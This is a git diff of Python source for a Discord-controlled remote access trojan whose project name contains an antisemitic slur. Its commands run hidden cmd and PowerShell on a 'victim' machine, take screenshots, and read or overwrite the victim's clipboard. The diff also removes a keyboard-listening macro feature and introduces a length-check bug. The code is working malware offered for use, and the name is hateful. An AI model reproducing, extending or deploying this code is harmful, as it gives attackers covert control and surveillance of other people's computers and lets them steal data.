@@ -4,7 +4,6 @@ from Cryptodome.Cipher import AES
 from discord.ext import commands
 from PIL import Image, ImageDraw
 from comtypes import CLSCTX_ALL
-from pynput import keyboard
 import soundcard as sc
 import win32com.client
 import numpy as np
@@ -22,7 +21,6 @@ import requests
 import asyncio
 import discord
 import getpass
-import hashlib
 import sqlite3
 import tarfile
 import base64
@@ -47,9 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.7" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
-
-FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
+version = "1.0.6.9" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 intents = discord.Intents.all()
 
@@ -58,14 +54,14 @@ bot.remove_command('help')
 pyautogui.FAILSAFE = False
 
 async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "output.txt", header=""):
-    if len(content) > 2000:
+    if len(header + header) > 2000:
         buf = io.BytesIO((alt_content or content).encode("utf-8"))
         await ctx.send(header, file=discord.File(fp=buf, filename=filename))
     else:
         await ctx.send(header + content)
 
 async def fm_reply(ctx, content: str, alt_content: str = None, filename: str = "output.txt", header=""):
-    if len(content) > 2000:
+    if len(header + content) > 2000:
         buf = io.BytesIO((alt_content or content).encode("utf-8"))
         await ctx.reply(header, file=discord.File(fp=buf, filename=filename))
     else:
@@ -293,275 +289,6 @@ async def vol(ctx, action: str = "query", value: int = None):
     except Exception as e:
         await ctx.send(f"Error adjusting volume: {str(e)}")
 
-# -------------------
-#       PYMACRO
-# -------------------
-
-variables = {}
-
-def f_wait_for_keys_internal(key_combo, ctxchannel):
-    key_combo = key_combo.lower().split()
-    keys_pressed = set()
-
-    def on_press(key):
-        try:
-            if hasattr(key, 'char') and key.char:
-                keys_pressed.add(key.char.lower())
-            elif hasattr(key, 'name') and key.name:
-                keys_pressed.add(key.name.lower())
-            
-            if all(k in keys_pressed for k in key_combo):
-                return False
-        except Exception as e:
-            asyncio.run(ctxchannel.send(f"Error in key listener: {e}"))
-
-    def on_release(key):
-        try:
-            if hasattr(key, 'char') and key.char:
-                keys_pressed.discard(key.char.lower())
-            elif hasattr(key, 'name') and key.name:
-                keys_pressed.discard(key.name.lower())
-        except Exception as e:
-            asyncio.run(ctxchannel.send(f"Error in key listener: {e}"))
-
-    asyncio.run(ctxchannel.send(f"Waiting for keys: {' '.join(key_combo)}"))
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
-def f_evaluate_expression_internal(expression):
-    try:
-        resolved_expression = f_resolve_expression_internal(expression)
-        return eval(resolved_expression, {"__builtins__": None}, {})
-    except Exception as e:
-        raise ValueError(f"Error evaluating expression: {expression}. Error: {str(e)}")
-
-def f_parse_wrapped_string_internal(arg):
-    if arg.startswith('"') and arg.endswith('"'):
-        return re.sub(r'\\(["\'])', r'\1', arg[1:-1])
-    elif arg.startswith("'") and arg.endswith("'"):
-        return re.sub(r'\\(["\'])', r'\1', arg[1:-1])
-    return arg
-
-def f_resolve_expression_internal(expression):
-    try:
-        expression = re.sub(
-            r"\!\$\{\%clip\%\}",
-            lambda m: pyperclip.paste(),
-            expression
-        )
-
-        expression = re.sub(
-            r"\$\{([^}]+)\}",
-            lambda m: str(variables.get(m.group(1), "")),
-            expression
-        )
-
-        expression = re.sub(
-            r"\$\{~([^}]+)~\}",
-            lambda m: str(os.getenv(m.group(1), "")),
-            expression
-        )
-
-        expression = re.sub(
-            r"\$\{\+([^}]+)\+\}",
-            lambda m: str(os.getenv(m.group(1), "")),
-            expression
-        )
-
-        return expression
-    except Exception as e:
-        raise ValueError(f"Error resolving expression: {expression}. Error: {str(e)}")
-
-def f_set_variable_internal(var, value):
-    if var.startswith("~") and var.endswith("~"):
-        os.environ[var[1:-1]] = value
-    elif var.startswith("+") and var.endswith("+"):
-        os.system(f"setx {var[1:-1]} {value}")
-    else:
-        variables[var] = value
-
-async def f_parse_internal(command, ctx):
-    try:
-        parts = command.strip().split()
-        if not parts:
-            return
-
-        cmd = parts[0].lower()
-
-        def resolve_args(args):
-            return [f_resolve_expression_internal(f_parse_wrapped_string_internal(arg)) for arg in args]
-
-        if cmd == "cursor":
-            x = int(f_evaluate_expression_internal(parts[1]))
-            y = int(f_evaluate_expression_internal(parts[2]))
-            pyautogui.moveTo(x, y)
-        
-        elif cmd == "key":
-            key = f_resolve_expression_internal(parts[1].lower())
-            action = parts[2].lower() if len(parts) > 2 else "press"
-            if action == "down":
-                pyautogui.keyDown(key)
-            elif action == "up":
-                pyautogui.keyUp(key)
-            elif action == "press":
-                pyautogui.press(key)
-
-        elif cmd == "hotkey":
-            combo = resolve_args(parts[1:])
-            pyautogui.hotkey(*combo)
-
-        elif cmd == "wait":
-            if len(parts) > 2 and parts[-1].lower() in {"ms", "s", "sec", "seconds", "milliseconds"}:
-                duration_expr = " ".join(parts[1:-1])
-                unit = parts[-1].lower()
-            else:
-                duration_expr = " ".join(parts[1:])
-                unit = "ms"
-
-            duration = float(f_evaluate_expression_internal(duration_expr))
-
-            if unit.startswith("ms"):
-                await asyncio.sleep(duration / 1000)
-            elif unit.startswith("s"):
-                await asyncio.sleep(duration)
-
-        elif cmd == "write":
-            text = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[1:])))
-            pyautogui.write(text)
-
-        elif cmd == "mb":
-            button_map = {1: "left", 2: "right", 3: "middle", 4: "x1", 5: "x2"}
-            button = button_map.get(int(f_resolve_expression_internal(parts[1])), "left")
-            action = parts[2].lower() if len(parts) > 2 else "press"
-            if action == "down":
-                pyautogui.mouseDown(button=button)
-            elif action == "up":
-                pyautogui.mouseUp(button=button)
-            elif action == "press":
-                pyautogui.click(button=button)
-
-        elif cmd == "scroll":
-            amount = int(f_evaluate_expression_internal(parts[1]))
-            pyautogui.scroll(amount)
-
-        elif cmd == "clip":
-            subcmd = parts[1].lower()
-            if subcmd == "copy":
-                text = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[2:])))
-                pyperclip.copy(text)
-            elif subcmd == "paste":
-                pyautogui.write(pyperclip.paste())
-            elif subcmd == "clear":
-                pyperclip.copy("")
-            else:
-                raise ValueError(f"Invalid clip action: {subcmd}")
-
-        elif cmd == "set":
-            var = parts[1]
-            value = f_resolve_expression_internal(" ".join(parts[2:]))
-            f_set_variable_internal(var, f_parse_wrapped_string_internal(value))
-
-        elif cmd == "del":
-            var = parts[1]
-            if var.startswith("~") and var.endswith("~"):
-                os.environ.pop(var[1:-1], None)
-            elif var.startswith("+") and var.endswith("+"):
-                os.system(f"setx {var[1:-1]} ''")
-            else:
-                variables.pop(var, None)
-
-        elif cmd == "continue":
-            keys = resolve_args(parts[1:])
-            f_wait_for_keys_internal(" ".join(keys), ctx)
-
-        elif cmd == "log":
-            message = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[1:])))
-            await ctx.send(message)
-
-    except Exception as e:
-        await ctx.send(f"Error processing command: {command}")
-        await ctx.send(f"Exception: {e}")
-
-def f_parse_config_options_internal(script):
-    config = {
-        "DisableAdminVarWarning": False,
-        "FuncSplit": ";",
-        "CommentOverride": None,
-    }
-    new_script_lines = []
-
-    for line in script.splitlines():
-        line = line.strip()
-        if line.startswith("@"):
-            if line.lower() == "@disableadminvarwarning":
-                config["DisableAdminVarWarning"] = True
-            elif line.lower().startswith("@funcsplit ="):
-                split_char = line.split("=", 1)[1].strip().strip('"')
-                config["FuncSplit"] = split_char
-            elif line.lower().startswith("@commentoverride ="):
-                comment_char = line.split("=", 1)[1].strip().strip('"')
-                config["CommentOverride"] = None if comment_char.lower() == "none" else comment_char
-        else:
-            new_script_lines.append(line)
-
-    return config, "\n".join(new_script_lines)
-
-async def i_macro(execstr, ctx, echo_errors=True):
-    try:
-        if execstr is None:
-            ctx.send("Input cannot be None")
-            return
-
-        config, cleaned_script = f_parse_config_options_internal(execstr)
-
-        if not config["DisableAdminVarWarning"]:
-            sys_var_pattern = r"set\s+\+([^\+]+)\+\s+"
-            matches = re.findall(sys_var_pattern, execstr)
-            if matches:
-                ctx.send("WARNING: This script modifies system environment variables.")
-                ctx.send("         These changes will only work if the program is run as administrator.")
-                ctx.send(f"         Detected system variables: {', '.join(matches)}\n\n")
-
-        commands = (
-            cleaned_script.split(config["FuncSplit"])
-            if config["FuncSplit"] != "\\n"
-            else [line for line in cleaned_script.splitlines() if line.strip()]
-        )
-
-        for command in commands:
-            if config["CommentOverride"] and config["CommentOverride"] in command:
-                command = command.split(config["CommentOverride"], 1)[0].strip()
-
-            if not command:
-                continue
-
-            await f_parse_internal(command.strip(), ctx)
-
-    except Exception as e:
-        if echo_errors:
-            ctx.send(f"Error running macro:")
-            ctx.send(f"Exception: {e}")
-
-@bot.command(help="A modified version of PyMacro to work as a discord bot, docs at https://github.com/gabrielzv1233/PyMacro/blob/main/readme.md", usage="$macro <script/file>")
-async def macro(ctx, *, command: str = None):
-    if ctx.message.attachments:
-        if len(ctx.message.attachments) > 1:
-            await ctx.send("Please attach only one .pymacro file at a time.")
-            return
-        
-        attachment = ctx.message.attachments[0]
-        if attachment.filename.lower().endswith(".pymacro"):
-            file_bytes = await attachment.read()
-            script_content = file_bytes.decode("utf-8")
-            await i_macro(script_content.strip(), ctx)
-            return
-        
-    elif command != None:
-        await i_macro(command.strip(), ctx)
-        return
-        
-    await ctx.send("No .pymacro file attached!")
-
 async def terminate_process(proc: subprocess.Popen, ctx):
     try:
         try:
@@ -589,14 +316,10 @@ async def cmd(ctx, *, command: str = None):
         if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
             creation |= subprocess.CREATE_NEW_PROCESS_GROUP
 
-        process = subprocess.Popen(
+        proc = await asyncio.create_subprocess_shell(
             f'cmd /c "{command}"',
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            encoding="utf-8",
-            errors="replace",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.STDOUT,
             creationflags=creation
         )
 
@@ -628,7 +351,7 @@ async def cmd(ctx, *, command: str = None):
                     try:
                         await bot.wait_for("thread_delete", check=lambda t: t.id == thread.id)
                         thread_deleted = True
-                        await terminate_process(process, ctx)
+                        await terminate_process(proc, ctx)
                     except Exception:
                         pass
 
@@ -648,7 +371,7 @@ async def cmd(ctx, *, command: str = None):
                 return True
             except (discord.NotFound, discord.Forbidden):
                 thread_deleted = True
-                await terminate_process(process, ctx)
+                await terminate_process(proc, ctx)
                 return False
 
         async def flush(force=False):
@@ -672,15 +395,15 @@ async def cmd(ctx, *, command: str = None):
         while True:
             if thread_deleted:
                 break
-            line = process.stdout.readline()
-            if line == "" and process.poll() is not None:
-                break
+            line = await proc.stdout.readline()
             if not line:
+                if proc.returncode is not None:
+                    break
                 await asyncio.sleep(0.02)
                 await flush()
                 continue
 
-            s = line.rstrip("\r\n")
+            s = line.decode("utf-8", "replace").rstrip("\r\n")
             if not s:
                 continue
 
@@ -732,25 +455,17 @@ async def ps(ctx, *, command: str = None):
             "-Command", f"{ps_boot}; & {{ {command} }} 2>&1"
         ]
 
-        si = subprocess.STARTUPINFO()
-        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        si.wShowWindow = 0
-
         creation = 0
         if hasattr(subprocess, "CREATE_NO_WINDOW"):
             creation |= subprocess.CREATE_NO_WINDOW
         if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
             creation |= subprocess.CREATE_NEW_PROCESS_GROUP
 
-        process = subprocess.Popen(
-            ps_cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            stdin=subprocess.DEVNULL,
-            text=True,
-            encoding="utf-8",
-            errors="replace",
-            startupinfo=si,
+        proc = await asyncio.create_subprocess_exec(
+            *ps_cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.STDOUT,
+            stdin=asyncio.subprocess.DEVNULL,
             creationflags=creation
         )
 
@@ -782,7 +497,7 @@ async def ps(ctx, *, command: str = None):
                     try:
                         await bot.wait_for("thread_delete", check=lambda t: t.id == thread.id)
                         thread_deleted = True
-                        await terminate_process(process, ctx)
+                        await terminate_process(proc, ctx)
                     except Exception:
                         pass
 
@@ -802,7 +517,7 @@ async def ps(ctx, *, command: str = None):
                 return True
             except (discord.NotFound, discord.Forbidden):
                 thread_deleted = True
-                await terminate_process(process, ctx)
+                await terminate_process(proc, ctx)
                 return False
 
         async def flush(force=False):
@@ -826,15 +541,15 @@ async def ps(ctx, *, command: str = None):
         while True:
             if thread_deleted:
                 break
-            line = process.stdout.readline()
-            if line == "" and process.poll() is not None:
-                break
+            line = await proc.stdout.readline()
             if not line:
+                if proc.returncode is not None:
+                    break
                 await asyncio.sleep(0.02)
                 await flush()
                 continue
 
-            s = line.rstrip("\r\n")
+            s = line.decode("utf-8", "replace").rstrip("\r\n")
             if not s:
                 continue
 
@@ -1827,20 +1542,29 @@ async def key(ctx, *, key: str = ""):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
 
-@bot.command(aliases=["get_clipboard"], help="Get victims clipboard.", usage="$get_clipboard")
-async def getclipboard(ctx):
+@bot.command(help="Get or set the victim's clipboard.", usage="$clipboard <get|set <text>>")
+async def clipboard(ctx, *, args: str = None):
     try:
-        await ctx.send(f"Current clipboard: ```{pyperclip.paste()}```")
+        if not args:
+            await ctx.send("Usage: `$clipboard <get|set <text>>`")
+            return
+
+        parts = args.split(" ", 1)
+        action = parts[0].lower()
+
+        if action == "get":
+            clip = pyperclip.paste()
+            await ctx.fm_send(f"```{clip}```", clip, "clipboard.txt", "Current Clipboard.txt")
+        elif action == "set":
+            if len(parts) == 1:
+                await ctx.send("Please provide text to set.")
+                return
+            pyperclip.copy(parts[1])
+            await ctx.send("Copied to clipboard.")
+        else:
+            await ctx.send("Invalid action. Use `get` or `set`.")
     except Exception as e:
-        await ctx.send(f"Error executing command: {str(e)}")
-        
-@bot.command(aliases=["set_clipboard"], help="Copy given text to victims clipboard.", usage="$set_clipboard <text>")
-async def setclipboard(ctx, *, text: str):
-    try:
-        pyperclip.copy(text)
-        await ctx.send(f"Copied to clipboard")
-    except Exception as e:
-        await ctx.send(f"Error executing command: {str(e)}")   
+        await ctx.send(f"Error executing command: {e}")
 
 @bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).", usage="$ss [displayNum|0 (default/all)]")
 async def ss(ctx, display_index: int = 0):
@@ -1867,7 +1591,7 @@ async def ss(ctx, display_index: int = 0):
             await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(fp=buffer, filename="screenshot.png"))
     except Exception as e:
         await ctx.send(f"Error executing screenshot command: {str(e)}")
-                
+  
 _tts_thread = None
 _tts_error = None
 _tts_stop = None
